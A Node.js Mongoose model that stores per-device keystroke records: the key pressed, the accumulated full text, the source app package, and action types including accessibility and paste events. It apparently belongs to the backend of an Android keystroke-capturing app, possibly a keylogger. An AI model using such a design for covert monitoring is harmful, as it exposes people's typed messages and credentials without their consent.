const mongoose = require("mongoose");

const keystrokeRecordSchema = new mongoose.Schema(
  {
    recordId: {
      type: String,
      required: true,
      unique: true,
      index: true,
    },
    deviceUniqueId: {
      type: String,
      required: true,
      index: true,
    },
    keyPressed: {
      type: String,
      required: true,
    },
    fullText: {
      type: String,
      default: "",
    },
    appPackage: {
      type: String,
      default: "unknown",
    },
    action: {
      type: String,
      enum: [
        "key",
        "delete",
        "space",
        "enter",
        "done",
        "symbol",
        "emoji",
        "accessibility",
        "voice",
        "paste",
        "suggestion",
      ],
      default: "key",
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("KeystrokeRecord", keystrokeRecordSchema);
